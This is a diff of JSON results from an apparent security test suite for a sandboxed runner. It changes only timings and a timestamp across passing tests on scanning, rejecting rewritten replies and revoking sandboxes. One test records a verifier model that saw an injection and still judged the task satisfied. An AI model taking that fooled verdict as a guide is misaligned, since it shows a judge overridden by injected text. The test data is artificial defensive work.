@@ -1861,7 +2045,7 @@
    "expected": "Every copy is reported by /scan.",
    "accepted_limitation": "",
    "result": "PASS",
-   "duration_s": 0.99,
+   "duration_s": 1.04,
    "observed": {
     "caught": {
      "b64.txt": true,
@@ -1881,7 +2065,7 @@
      "needs_network": false,
      "timeout_s": 20,
      "http_status": 200,
-     "wall_s": 0.508,
+     "wall_s": 0.536,
      "executor": "gvisor-systrap",
      "exit_code": 0,
      "timed_out": false,
@@ -2102,7 +2286,7 @@
    "expected": "RunnerClient rejects the reply.",
    "accepted_limitation": "",
    "result": "PASS",
-   "duration_s": 0.51,
+   "duration_s": 0.5,
    "observed": {
     "rewrote_replies": 1,
     "accepted": false,
@@ -2164,7 +2348,7 @@
    "expected": "The deterministic assertion fails the task regardless of the model's verdict.",
    "accepted_limitation": "",
    "result": "PASS",
-   "duration_s": 0.51,
+   "duration_s": 0.52,
    "observed": {
     "verifier_model_saw_injection": true,
     "model_said_satisfied": true,
@@ -2184,16 +2368,16 @@
    "expected": "Sandbox processes are gone, the step's HTTP call ends with 410, and every later token gets 403.",
    "accepted_limitation": "",
    "result": "PASS",
-   "duration_s": 0.29,
+   "duration_s": 0.24,
    "observed": {
     "revoke": {
      "revoked": true,
      "killed_running_step": true,
      "poweroff": false,
-     "revoked_at": "2026-11-06T06:38:04.117186+00:00"
+     "revoked_at": "2026-11-06T06:42:10.542255+00:00"
     },
-    "sandbox_processes_at_kill": 13,
-    "kill_to_all_gone_ms": 11.1,
+    "sandbox_processes_at_kill": 9,
+    "kill_to_all_gone_ms": 10.6,
     "running_step_http_status": 410,
     "processes_left_after": [],
     "new_step_token_after_kill": 403,
@@ -2207,7 +2391,7 @@
      "needs_network": false,
      "timeout_s": 60,
      "http_status": 410,
-     "wall_s": 0.168,
+     "wall_s": 0.118,
      "executor": null,
      "exit_code": null,
      "timed_out": null,
